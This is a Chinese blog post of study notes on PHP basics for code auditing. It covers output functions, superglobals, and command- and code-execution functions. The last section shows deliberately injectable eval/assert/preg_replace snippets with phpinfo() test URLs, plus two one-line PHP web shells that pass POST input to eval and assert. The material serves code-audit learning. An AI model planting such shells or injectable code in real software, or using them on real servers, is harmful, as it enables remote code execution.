---
author: 星火燎原@vxhly
title: PHP 代码审计之 PHP 基础知识
categories: [design]
tags: [PHP, Security, Pentest]
date: 2017-05-19 17:31:01
---

::: tip
本文主要为学习代码审计前的一些 PHP 基础知识的学习笔记
:::
<!-- more -->

## PHP 调试输出方法

* `echo` : 输出一个或多个字符串
* `print` : 输出字符串输出字符串
* `print_r` : 打印关于变量的易于理解的信息, 常用来打印数组
* `var_dump` : 打印变量的相关信息
* `var_export` : 输出或返回一个变量的字符串表示

### echo

输出一个或多个字符串, 语法说明: 

``` php
void echo ( string $arg1 [, string $... ] ) // 输出所有参数。
```

`echo` 不是一个函数（它是一个语言结构）, 因此你不一定要使用小括号来指明参数, 单引号, 双引号都可以。 `echo` （不像其他语言构造）不表现得像一个函数, 所以不能总是使用一个函数的上下文。 另外, 如果你想给 `echo` 传递多个参数, 那么就不能使用小括号。

### print

输出字符串, 语法说明: 

``` php
int print ( string $arg ) // 输出 arg。
```

print 实际上不是一个函数（它是一个语言结构）, 因此你可以不必使用圆括号来括起它的参数列表。

### print_r

打印关于变量的易于理解的信息, 语法说明: 

``` php
bool print_r ( mixed $expression [, bool $return ] )
```

`print_r()` 显示关于一个变量的易于理解的信息。如果给出的是 string、integer 或 float, 将打印变量值本身。如果给出的是 array, 将会按照一定格式显示键和元素。

### var_dump

打印变量的相关信息, 语法说明: 

``` php
void var_dump ( mixed $expression [, mixed $... ] )
```

此函数显示关于一个或多个表达式的结构信息, 包括表达式的类型与值。数组将递归展开值, 通过缩进显示其结构。

### var_export

输出或返回一个变量的字符串表示, 语法说明: 

``` php
mixed var_export ( mixed $expression [, bool $return ] )
```

此函数返回关于传递给该函数的变量的结构信息, 它和 `var_dump()` 类似, 不同的是其返回的表示是合法的 PHP 代码。我们也可以通过将函数的第二个参数设置为 TRUE, 从而返回变量的表示。

另外还有一个函数 `debug_zval_dump` 可以进行输出, 其结果与 vardump 类似, 但比 vardump 多一个记录变量被引用次数的值 refcount。这个函数很少使用。

PHP 中单引号和双引号的区别。单引号内部的变量不会被执行, 双引号内部的变量会被执行。

## PHP 超全局变量数组

* `$_SERVER` : 变量由 Web 服务器设定或直接与当前脚本的执行环境相关联
* `$_ENV` : 执行环境提交至脚本的变量
* `$_GET` : 经由 URL 请求提交至脚本的变量
* `$_POST` : 经由 HTTP POST 方法提交至脚本的变量
* `$_REQUEST` : 经由 GET, POST 和 COOKIT 机制提交至脚本的变量, 因此该数组不值得信任
* `$_FILES` : 经由 HTTP POST 方法上传而提交至脚本的变量
* `$_COOKIE` : 经由 HTTP Cookies 方法提交至脚本的变量
* `$_SESSION` : 当前注册给脚本会话的变量
* `$GLOBALS` : 包含一个引用指向每个当前脚本的全局范围内有效的变量。改数组的键名为全局变量的名称

### 服务器变量: $_SERVER

`$_SERVER` 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些。

例如使用以下代码: 

``` php
<?PHP
  print_r($_SERVER);
?>
```

输出为

``` php
Array (
  [HTTP_ACCEPT] => text/html, application/xhtml+xml
  [HTTP_ACCEPT_LANGUAGE] => zh-CN
  [HTTP_USER_AGENT] => Mozilla/5.0 (Windows NT 6.1;WOW64;Trident/7.0;rv:11.0) like Gecko
  [HTTP_ACCEPT_ENCODING] => gzip, deflate
  [HTTP_HOST] => localhost
  [HTTP_DNT] => 1
  [HTTP_CONNECTION] => Keep-Alive
  [PATH] => C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;
  [SystemRoot] => C:\Windows
  [COMSPEC] => C:\Windows\system32\cmd.exe
  [PATHEXT] => .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  [WINDIR] => C:\Windows
  [SERVER_SIGNATURE] =>
  [SERVER_SOFTWARE] => Apache/2.2.21 (Win32) PHP/5.3.10
  [SERVER_NAME] => localhost
  [SERVER_ADDR] => 127.0.0.1
  [SERVER_PORT] => 80
  [REMOTE_ADDR] => 127.0.0.1
  [DOCUMENT_ROOT] => D:/wamp/www/
  [SERVER_ADMIN] => admin@localhost
  [SCRIPT_FILENAME] => D:/wamp/www/1.php
  [REMOTE_PORT] => 50875
  [GATEWAY_INTERFACE] => CGI/1.1
  [SERVER_PROTOCOL] => HTTP/1.1
  [REQUEST_METHOD] => GET
  [QUERY_STRING] =>
  [REQUEST_URI] => /1.php
  [SCRIPT_NAME] => /1.php
  [PHP_SELF] => /1.php
  [REQUEST_TIME] => 1451400854
)
```

下面列出了所有 `$_SERVER` 变量中的重要元素:

* `$_SERVER['PHP_SELF']` : 当前执行脚本的文件名, 与 document root 有关。例如, 在地址为 <http://example.com/test.php/foo.bar> 的脚本中使用 `$_SERVER['PHP_SELF']` 将得到 /test.php/foo.bar。FILE 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始, 如果 PHP 以命令行模式运行, 这个变量将包含脚本名。之前的版本该变量不可用。
* `$_SERVER['GATEWAY_INTERFACE']` : 服务器使用的 CGI 规范的版本；例如, "CGI/1.1"。
* `$_SERVER['SERVER_ADDR']` : 当前运行脚本所在的服务器的 IP 地址。|
* `$_SERVER['SERVER_NAME']` : 当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中, 该名称是由那个虚拟主机所设置的值决定。
* `$_SERVER['SERVER_SOFTWARE']` : 服务器标识字符串, 在响应请求时的头信息中给出。 (如: Apache/2.2.24)
* `$_SERVER['SERVER_PROTOCOL']` : 请求页面时通信协议的名称和版本。例如, "HTTP/1.0"。
* `$_SERVER['REQUEST_METHOD']` : 访问页面使用的请求方法；例如, "GET", "HEAD", "POST", "PUT"。
* `$_SERVER['REQUEST_TIME']` : 请求开始时的时间戳。从 PHP 5.1.0 起可用。 (如: 1377687496)
* `$_SERVER['QUERY_STRING']` : query string（查询字符串）, 如果有的话, 通过它进行页面访问。
* `$_SERVER['HTTP_ACCEPT']` : 当前请求头中 Accept: 项的内容, 如果存在的话。
* `$_SERVER['HTTP_ACCEPT_CHARSET']` : 当前请求头中 Accept-Charset: 项的内容, 如果存在的话。例如: "iso-8859-1, *, utf-8"。
* `$_SERVER['HTTP_HOST']` : 当前请求头中 Host: 项的内容, 如果存在的话。
* `$_SERVER['HTTP_REFERER']` : 引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项, 有的还提供了修改 HTTP_REFERER 的功能。简言之, 该值并不可信。)
* `$_SERVER['HTTPS']` : 如果脚本是通过 HTTPS 协议被访问, 则被设为一个非空的值。
* `$_SERVER['REMOTE_ADDR']` : 浏览当前页面的用户的 IP 地址。
* `$_SERVER['REMOTE_HOST']` : 浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。
* `$_SERVER['REMOTE_PORT']` : 用户机器上连接到 Web 服务器所使用的端口号。
* `$_SERVER['SCRIPT_FILENAME']` : 当前执行脚本的绝对路径。
* `$_SERVER['SERVER_ADMIN']` : 该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上, 则该值是那个虚拟主机的值。（如: admin@localhost）
* `$_SERVER['SERVER_PORT']` : Web 服务器使用的端口。默认值为 "80"。如果使用 SSL 安全连接, 则这个值为用户设置的 HTTP 端口。
* `$_SERVER['SERVER_SIGNATURE']` : 包含了服务器版本和虚拟主机名的字符串。
* `$_SERVER['PATH_TRANSLATED']` : 当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。
* `$_SERVER['SCRIPT_NAME']` : 包含当前脚本的路径。这在页面需要指向自己时非常有用。**FILE** 常量包含当前脚本(例如包含文件)的完整路径和文件名。
* `$_SERVER['SCRIPT_URI']` : URI 用来指定要访问的页面。例如 "/index.html"。

### 环境变量: $_ENV

`$_ENV` 数组中的内容是在 PHP 解析器运行时, 从 PHP 所在服务器中的环境变量转变为 PHP 全局变量的。它们中的许多都是由 PHP 所运行的系统决定的, 完整的列表是不可能的, 需要查看 PHP 所在的服务器的系统文档以确定其特定的环境变量。

我们可以使用以下代码输出 `$_ENV` 的全部信息: 

``` php
<?php
  print_r($_ENV);
?>
```

输出为

``` php
Array (
  [ALLUSERSPROFILE] => C:\ProgramData
  [APPDATA] => C:\Windows\system32\config\systemprofile\AppData\Roaming
  [CommonProgramFiles] => C:\Program Files (x86)\Common Files
  [CommonProgramFiles(x86)] => C:\Program Files (x86)\Common Files
  [CommonProgramW6432] => C:\Program Files\Common Files
  [COMPUTERNAME] => WIN-46K74EGCQQV
  [ComSpec] => C:\Windows\system32\cmd.exe
  [FP_NO_HOST_CHECK] => NO
  [LOCALAPPDATA] => C:\Windows\system32\config\systemprofile\AppData\Local
  [NUMBER_OF_PROCESSORS] => 2
  [OS] => Windows_NT
  [Path] => C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Python27\
  [PATHEXT] => .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  [PROCESSOR_ARCHITECTURE] => x86
  [PROCESSOR_ARCHITEW6432] => AMD64
  [PROCESSOR_IDENTIFIER] => Intel64 Family 6 Model 63 Stepping 2, GenuineIntel
  [PROCESSOR_LEVEL] => 6
  [PROCESSOR_REVISION] => 3f02
  [ProgramData] => C:\ProgramData
  [ProgramFiles] => C:\Program Files (x86)
  [ProgramFiles(x86)] => C:\Program Files (x86)
  [ProgramW6432] => C:\Program Files
  [PSModulePath] => C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
  [PUBLIC] => C:\Users\Public
  [SystemDrive] => C:
  [SystemRoot] => C:\Windows
  [TEMP] => C:\Windows\TEMP
  [TMP] => C:\Windows\TEMP
  [USERDOMAIN] => WORKGROUP
  [USERNAME] => WIN-46K74EGCQQV$
  [USERPROFILE] => C:\Windows\system32\config\systemprofile
  [windir] => C:\Windows
  [windows_tracing_flags] => 3
  [windows_tracing_logfile] => C:\BVTBin\Tests\installpackage\csilogfile.log
  [AP_PARENT_PID] => 2832
  )
```

注: 如果 `$_ENV` 输出为空, 是因为 php.ini 中的 variables_order 值为 "GPCS", 也就是说系统在定义 PHP 预定义变量时的顺序是 GET, POST, COOKIES 和 SERVER, 没有定义 Environment(E), 只需要将 variables_order 值修改为 "EGPCS" 即可。

### URL GET 变量: $_GET

`$_GET` 数组是通过 URL GET 方法传递的变量组成的数组。它属于外部变量, 即在服务器页面中通过 $_GET 数组获取 URL 方法传递过来的参数。例如服务器端有如下代码: 

``` php
<?php
  echo '参数action的值为: '.$_GET["action"].'<br>';
  echo '参数username的值为: '.$_GET["username"].'<br>';
  echo '参数password的值为: '.$_GET["password"].'<br>';
?>
```

然后使用以下 URL 进行访问: 

``` html
//localhost/1.php?action=login&username=admin&password=admin
```

输出即为: 

> 参数 action 的值为: login<br>
> 参数 username 的值为: admin<br>
> 参数 password 的值为: admin

### HTTP POST 变量: $_POST

`$_POST` 数组类似于 `$_GET` 数组, 不过是通过 HTTP POST 传递的变量组成的数组。$_GET 和 $_POST 都可以保存表单提交的变量, 具体使用哪一种方法依据表单 form 标记中的 method 方法为 POST 或是 GET。例如以下代码构造一个登陆界面: 

login.html

``` html
<html>
<meta http-equiv='Content-Type' content='text/html;charset=utf-8' />

<head>
    <title>登陆</title>
</head>

<body>
    <form action="login_check.php" method="post">
        用户名: <input type="text" name="name"><br>
        密 码: <input type="password" name="password"><br>
        <input type="submit" value="登陆">
    </form>
</body>

</html>
```

login_check.php

``` php
<?php
  echo 'name:'.$_POST["name"].'<br>';
  echo 'password:'.$_POST["password"].'<br>';
?>
```

这样在我们登陆过后就会显示我们 POST 提交的数据了: 

> name:admin<br>
> password:admin

### request 变量: $_REQUEST

`$_REQUEST` 数组包含 `$_GET` , `$_POST` 和 `$_COOKIE` 中的全部内容。假设表单内有一个输入域名为 name="name", 如果通过 GET 方法提交, 我们可以使用 $_GET["name"] 进行访问；如果通过 POST 方法提交, 我们可以使用 $_POST["name"] 进行访问。但无论是通过 GET 或是 POST 提交的, 我们都可以使用 $_REQUEST["name"] 进行访问。

不过 `$_REQUEST` 速度较慢, 而且较不安全, 所以不推荐使用。

### HTTP 文件上传变量: $_FILES

使用表单的 file 输入域上传文件时, 必须使用 POST 提交。但在服务器文件中, 并不能通过 `$_POST` 获取到表单中的 file 域的内容。而 `$_FILES` 数据就是表单通过 POST 上传文件项目组成的数组。

`$_FILES` 数组是一个二维数组, 包含 5 个字数组元素: 

* `$_FILES["file"]["name"]` : 客户端机器文件的原名称, 包含扩展名
* `$_FILES["file"]["size"]` : 已上传文件的大小, 单位为字节
* `$_FILES["file"]["tmp_name"]` : 伴随上传时产生的错误信息, 有 5 个可能的值

-- `0` : 表示没有发生任何错误, 文件上传成功
-- `1` : 表示上传文件的大小超出了在 PHP 配置文件中指令 upload maxfilesize 选项限制的值
-- `2` : 表示上传文件的大小超出了 HTML 表单中 MAXFILESIZE 选项所指定的值
-- `3` : 表示文件只被部分上传
-- `4` : 表示没有上传任何文件

* `$_FILES["file"]["error"]` 

* `$_FILES["file"]["type"]` 

下面简单构造一个文件上传的实例: 

file.html

``` html
<html>
<meta http-equiv='Content-Type' content='text/html;charset=utf-8' />

<head>
    <title>上传</title>
</head>

<body>
    <form action="upload.php" method="post" enctype="multipart/form-data">
        <label for="file">文件名:</label>
        <input type="file" name="file" id="file" />
        <br>
        <input type="submit" name="submit" value="上传" />
    </form>
</body>

</html>
```

upload.php

``` php
<?php
  echo '$_FILES["file"]["name"] = '.$_FILES["file"]["name"].'<br>';
  echo '$_FILES["file"]["size"] = '.$_FILES["file"]["size"].'<br>';
  echo '$_FILES["file"]["tmp_name"] = '.$_FILES["file"]["tmp_name"].'<br>';
  echo '$_FILES["file"]["error"] = '.$_FILES["file"]["error"].'<br>';
  echo '$_FILES["file"]["type"] = '.$_FILES["file"]["type"].'<br>';
?>
```

当不选择文件直接点击按钮时结果为: 

* $_FILES["file"]["name"] =
* $_FILES["file"]["size"] = 0
* $_FILES["file"]["tmp_name"] = 
* $_FILES["file"]["error"] = 4
* $_FILES["file"]["type"] =

当选择一个普通文件上传时结果为: 

* $_FILES["file"]["name"] = test.txt
* $_FILES["file"]["size"] = 383
* $_FILES["file"]["tmp_name"] = D:\wamp\tmp\phpFEE0.tmp
* $_FILES["file"]["error"] = 0
* $_FILES["file"]["type"] = text/plain

### HTTP Cookies: $_COOKIE

`$_COOKIE` 数组是经由 HTTP Cookies 方法提交至脚本的变量。通常这些 Cookies 是由以前执行的 PHP 脚本通过 setCookie() 函数设置到客户端浏览器中的, 当 PHP 脚本从客户浏览器提取了一个 cookie 后, 它将自动的把它转换成一个变量, 可以通过 `$_COOKIE` 数组和 cookie 名称来存取指定的 cookie 值。下面示例代码打印出当前会话的 Cookies: 

``` php
<?php
  //向客户端发送一个Cookie,将变量name值为admin,保存客户端一周的时间
  setcookie("name","admin",time()+60_60_24*7);
  print_r($_COOKIE);
?>
```

刷新两次后看到结果为: 

``` php
Array (
  [name] => admin
)
```

### Session 变量: $_SESSION

会话控制是在服务器端使用 session 跟踪用户。当服务器页面中使用 session_start() 函数开启 session 后, 就可以使用 `$_SESSION` 数组注册全局变量, 用户可以在整个网站中访问这些会话信息。

### 变量: $GLOBALS

`$GLOBALS` 是由所有已定义的全局变量组成的数组, 变量名就是该数组的索引。在所有的脚本中都有效, 在函数或对象的方法中不需要使用 global 关键字访问它。所以在函数中使用函数外部声明的全局变量时, 可以使用 `$GLOBALS` 数组代替 global 关键字。下面是示例代码: 

``` php
<?php
  $x = 75;
  $y = 25;
  function addition() {
      echo $GLOBALS['z'] = $GLOBALS['x'] + $GLOBALS['y'];
  }
  addition();
?>
```

## PHP 执行系统外部命令

PHP 用于执行系统外部命令的函数有: 

* `system()` : 输出并返回最后一行 shell 结果
* `exec()` : 不输出结果, 返回最后一行 shell 结果, 所有结果可以保存到一个返回的数组里面
* `passthru()` : 只调用命令, 把命令的运行结果原样地直接输出到标准输出设备上
* `shell_exec` : 通过 shell 环境执行命令, 并且将完整的输出以字符串的方式返回
* `popen` : 打开一个指向进程的管道, 该进程由派生给定的 command 命令执行而产生
* `proc_open` : 类似 popen() 函数, 但是 proc_open() 提供了更加强大的控制程序执行的能力
* `pcntl_exec` : 在当前进程空间执行指定程序
* ` `  `(反引号)` : 反引号中的内容作为外壳命令来执行, 并将其输出信息返回。效果与 shell_exec() 函数相同。

## PHP 代码执行函数

常见的代码执行函数有 3 个: 

* `eval` : 把字符串作为 PHP 代码执行
* `assert` : 检查一个断言是否为 FALSE
* `preg_replace` : 执行一个正则表达式的搜索和替换

### eval

把字符串作为 PHP 代码执行, 说明: 

``` php
mixed eval ( string $code )
```

把字符串 code 作为 PHP 代码执行。另外 `eval()` 是一个语言构造器而不是一个函数, 不能被可变函数调用。

`eval()` 返回 **NULL**, 除非在执行的代码中 return 了一个值, 函数返回传递给 return 的值。 如果在执行的代码中有一个解析错误, `eval()` 返回 **FALSE**, 之后的代码将正常执行。

下面示例为简单的文本合并: 

``` php
<?php
  $string = 'cup';
  $name = 'coffee';
  $str = 'This is a $string with my $name in it.';
  echo $str. "<br>";
  eval("\$str = \"$str\";");//执行命令为$str="$str";
  echo $str. "<br>";
?>
```

输出为

``` php
This is a $string with my $name in it.
This is a cup with my coffee in it.
```

下面在举另一个常见的命令注入的例子: 

``` php
<?php
    if(isset($_GET['cmd'])){
      $cmd = $_GET['cmd'];
      eval("\$cmd=$cmd;");
  }
?>
```

然后我们访问 URL <http://localhost/test.php?cmd=phpinfo%28%29> 就可以看到 phpinfo() 信息了。

另外最常见的 PHP 一句话木马就是 `eval()` 构成的: 

``` php
<?php @eval($_POST['pass']);?>
```

### assert

检查一个断言是否为 FALSE。说明: 

``` php
bool assert ( mixed $assertion [, string $description ] )
```

**assert()** 会检查指定的 assertion 并在结果为 **FALSE** 时采取适当的行动。

如果 assertion 是字符串, 它将会被 `assert()` 当做 PHP 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小, 并且在断言失败时消息会包含_ assertion 表达式。 这意味着如果你传入了 boolean 的条件作为 assertion, 这个条件将不会显示为断言函数的参数；在调用你定义的 `assert_options()` 处理函数时, 条件会转换为字符串, 而布尔值 **FALSE** 会被转换成空字符串。

`assert()` 的注入代码跟 `eval()` 类似, 经常在 eval 关键字被屏蔽时使用 assert 代替, 直接将上面示例中的 eval 改为 assert 即可: 

``` php
<?php
  if(isset($_GET['cmd'])){
      $cmd = $_GET['cmd'];
      assert("\$cmd=$cmd;");
  }
?>
```

同样访问 URL <http://localhost/test.php?cmd=phpinfo%28%29> 就可以看到 phpinfo() 信息了。

另外使用 assert 的一句话木马为: 

``` php
<?php @assert($_POST['pass']);?>
```

### preg_replace

执行一个正则表达式的搜索和替换, 说明: 

``` php
mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
```

搜索 subject 中匹配 pattern 的部分, 以 replacement 进行替换。

函数将返回替换后的字符串, 当 pattern 参数使用 /e 修正符时, `preg_replace` 函数会将 replacement 参数当作 PHP 代码执行, 那么, 针对此种情况, 当 replacement 内容为用户可控数据时, 就可能导致命令注入攻击漏洞的形成。为了测试 `preg_replace` 函数, 我们构造 PHP 代码如下: 

``` php
<?php
  $string = "hello world";
  $pattern = "/^/e";
  echo preg_replace($pattern, $_GET["str"], $string);
?>
```

然后访问 <http://localhost/test.php?str=phpinfo%28%29> 就可以看到 phpinfo() 信息了。

